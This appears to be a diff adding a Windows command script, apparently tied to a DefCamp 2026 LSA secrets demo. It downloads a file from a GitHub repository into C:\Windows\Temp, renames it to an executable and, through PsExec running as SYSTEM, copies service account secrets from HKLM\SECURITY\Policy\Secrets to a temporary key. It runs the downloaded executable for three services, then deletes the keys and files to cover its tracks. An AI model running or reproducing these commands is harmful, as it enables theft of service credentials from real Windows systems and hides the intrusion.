@@ -1,0 +1,13 @@
+cmd.exe /c curl.exe -s -L -o C:\Windows\Temp\ld.txt "https://github.com/phant0m-dancer/DefCamp2026_Demo_LSA/raw/main/defcamp_demo.txt"
+cmd.exe /c copy C:\Windows\Temp\ld.txt C:\Windows\Temp\ld.exe
+cmd.exe /c C:\Users\Administrator\Documents\test\PSTools\PsExec.exe -s -accepteula reg copy "HKLM\SECURITY\Policy\Secrets\_SC_FakeSQLSvc" "HKLM\SECURITY\Policy\Secrets\TempSecret2" /s /f
+cmd.exe /c C:\Users\Administrator\Documents\test\PSTools\PsExec.exe -s -accepteula C:\Windows\Temp\ld.exe
+cmd.exe /c C:\Users\Administrator\Documents\test\PSTools\PsExec.exe -s -accepteula reg delete "HKLM\SECURITY\Policy\Secrets\TempSecret2" /f
+cmd.exe /c C:\Users\Administrator\Documents\test\PSTools\PsExec.exe -s -accepteula reg copy "HKLM\SECURITY\Policy\Secrets\_SC_BackupSvc" "HKLM\SECURITY\Policy\Secrets\TempSecret2" /s /f
+cmd.exe /c C:\Users\Administrator\Documents\test\PSTools\PsExec.exe -s -accepteula C:\Windows\Temp\ld.exe
+cmd.exe /c C:\Users\Administrator\Documents\test\PSTools\PsExec.exe -s -accepteula reg delete "HKLM\SECURITY\Policy\Secrets\TempSecret2" /f
+cmd.exe /c C:\Users\Administrator\Documents\test\PSTools\PsExec.exe -s -accepteula reg copy "HKLM\SECURITY\Policy\Secrets\_SC_HRAppSvc" "HKLM\SECURITY\Policy\Secrets\TempSecret2" /s /f
+cmd.exe /c C:\Users\Administrator\Documents\test\PSTools\PsExec.exe -s -accepteula C:\Windows\Temp\ld.exe
+cmd.exe /c C:\Users\Administrator\Documents\test\PSTools\PsExec.exe -s -accepteula reg delete "HKLM\SECURITY\Policy\Secrets\TempSecret2" /f
+cmd.exe /c del C:\Windows\Temp\ld.exe
+cmd.exe /c del C:\Windows\Temp\ld.txt
